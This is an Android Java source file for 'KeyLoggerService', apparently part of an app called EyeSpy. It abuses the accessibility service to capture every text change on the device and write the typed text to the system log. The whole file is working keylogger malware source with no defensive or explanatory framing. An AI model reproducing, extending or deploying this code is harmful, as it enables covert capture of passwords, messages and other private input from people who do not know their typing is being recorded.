package com.eyespy.service;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

public class KeyLoggerService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            Log.d("EyeSpyLog", "Captured text: " + text);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d("EyeSpyLog", "Accessibility Service Interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d("EyeSpyLog", "Accessibility Service Connected");
    }
}
